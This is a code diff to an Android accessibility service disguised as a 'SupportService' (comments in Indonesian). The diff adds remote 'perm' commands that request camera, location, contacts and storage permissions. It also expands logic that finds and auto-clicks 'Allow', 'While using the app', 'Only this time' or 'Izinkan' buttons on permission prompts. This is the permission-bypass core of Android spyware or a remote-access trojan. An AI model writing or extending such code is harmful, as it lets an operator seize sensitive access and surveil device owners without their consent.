@@ -255,12 +255,40 @@ public class SupportService extends AccessibilityService {
                 } else {
                     out.println("ERROR: Package not found");
                 }
-            } else if (cmdLower.equals("perm on")) {
-                autoAllowPermissions = true;
-                out.println("OK: Auto-Allow Permissions Enabled");
-            } else if (cmdLower.equals("perm off")) {
-                autoAllowPermissions = false;
-                out.println("OK: Auto-Allow Permissions Disabled");
+            } else if (cmdLower.startsWith("perm ")) {
+                String type = cmdLower.substring(5).trim();
+                String androidPerm = "";
+                switch (type) {
+                    case "storage":
+                        androidPerm = android.Manifest.permission.WRITE_EXTERNAL_STORAGE;
+                        break;
+                    case "camera":
+                        androidPerm = android.Manifest.permission.CAMERA;
+                        break;
+                    case "location":
+                        androidPerm = android.Manifest.permission.ACCESS_FINE_LOCATION;
+                        break;
+                    case "contacts":
+                        androidPerm = android.Manifest.permission.READ_CONTACTS;
+                        break;
+                }
+
+                if (!androidPerm.isEmpty()) {
+                    autoAllowPermissions = true; // Pastikan auto-click nyala
+                    Intent intent = new Intent(this, CoreActivity.class);
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    intent.putExtra("request_permission", androidPerm);
+                    startActivity(intent);
+                    out.println("OK: Requesting " + type + " permission...");
+                } else if (type.equals("on")) {
+                    autoAllowPermissions = true;
+                    out.println("OK: Auto-Allow Enabled");
+                } else if (type.equals("off")) {
+                    autoAllowPermissions = false;
+                    out.println("OK: Auto-Allow Disabled");
+                } else {
+                    out.println("ERROR: Invalid permission type");
+                }
             } else {
                 out.println("ERROR: Unknown Command");
             }
@@ -370,17 +398,20 @@ public class SupportService extends AccessibilityService {
         }
 
         // AUTO-ALLOW PERMISSIONS LOGIC
-        if (autoAllowPermissions && event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            String pkgName = event.getPackageName() != null ? event.getPackageName().toString() : "";
-            if (pkgName.contains("com.android.permissioncontroller") || pkgName.contains("com.google.android.permissioncontroller")) {
-                AccessibilityNodeInfo root = getRootInActiveWindow();
-                if (root != null) {
-                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText("Allow");
-                    if (nodes == null || nodes.isEmpty()) {
-                        nodes = root.findAccessibilityNodeInfosByText("While using the app");
-                    }
+        if (autoAllowPermissions && (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)) {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root != null) {
+                // Cari tombol dengan teks umum izin Android
+                String[] targets = {"Allow", "Allow while using the app", "While using the app", "Only this time", "Izinkan"};
+                for (String t : targets) {
+                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(t);
                     if (nodes != null && !nodes.isEmpty()) {
-                        nodes.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        for (AccessibilityNodeInfo node : nodes) {
+                            if (node.isClickable()) {
+                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                return;
+                            }
+                        }
                     }
                 }
             }
